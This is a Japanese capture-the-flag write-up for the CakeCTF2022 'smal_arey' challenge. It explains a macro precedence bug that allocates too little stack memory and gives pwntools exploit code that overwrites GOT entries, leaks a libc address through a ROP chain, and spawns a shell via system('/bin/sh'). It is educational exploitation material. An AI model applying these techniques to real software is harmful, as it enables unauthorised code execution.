# smal_arey - CakeCTF2022

マクロの実装ミスによって確保される領域が少なく、
`size`を書き換えることができるので、
GOT Overwrite -> libcアドレスをリーク、
GOT Overwrite -> シェルを起動することが目的。

## 解法

以下のマクロの部分は、
`n`が5の場合を考えると`alloca(5 + 1 * sizeof(long))`と同等の意味になる。
本来は`alloca((5 + 1) * 8)`がほしいが、四則法則より`alloca(5 + 8)`しか確保されない。
```c
#define ARRAY_SIZE(n) (n * sizeof(long))
#define ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))
```

`size: 5`、`index: 2`、`value: 32`を入れたときの様子です。
4番目に`size`の値があります。
```none
gef> x/20xg $rsp
0x7fffffffe310: 0x0000000000401380      0x0000000000000020
0x7fffffffe320: 0x0000000000000003      0x00000000004011fa
0x7fffffffe330: 0x0000000000000005      0x0000000000000001
0x7fffffffe340: 0x00007fffffffe310      0x6b2f73d309740700
```

`size`の値が格納されている`index`を指定することができます。
`size`の値に大きな値を指定して、AAWを実現します。
```c
if (scanf("%ld", &size) != 1 || size < 0 || size > 5)
...
if (scanf("%ld", &index) != 1 || index < 0 || index >= size)
```

`0x7fffffffe340`のアドレス(`0x00007fffffffe310`)を
書き換えることでGOT Overwriteができるので、
GOT OverwriteからROPにつなげる手法[^1]を使います。

```python
rop_pop_rdi = 0x004013e3
rop_pop_r15 = 0x004013e2

def setvalue(idx, v):
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("value: ", str(v))

io.sendlineafter("size: ", "5")

# Leak GOT addr
setvalue(0, rop_pop_rdi)
setvalue(1, e.got["printf"])
setvalue(2, e.plt["printf"])
setvalue(3, e.sym["_start"])

# Overwrite size
setvalue(4, 0xffffffff)

setvalue(6, e.got["exit"])
setvalue(0, rop_pop_r15)
io.sendlineafter("index: ", str(-1))
```

`printf(printf@got)`を実行するROP chainを組み、
`main()`関数の処理に戻します。

リークしたGOTアドレスからlibcのベースアドレスを求めます。
```python
libc.address = u64(io.recvn(6)+b"\x00"*2) - libc.sym["printf"]
```

libcのアドレスがわかったら、`system("/bin/sh")`を実行するROP chainを組み、
シェルを起動します。
```python
io.sendlineafter("size: ", "5")
setvalue(0, rop_pop_rdi)
setvalue(1, next(libc.search(b"/bin/sh\x00")))
setvalue(2, libc.sym["system"])

setvalue(4, 0xffffffff)

setvalue(6, e.got["exit"])
setvalue(0, rop_pop_r15)
io.sendlineafter("index: ", str(-1))
```

[^1]: https://inaz2.hatenablog.com/entry/2016/12/17/180655
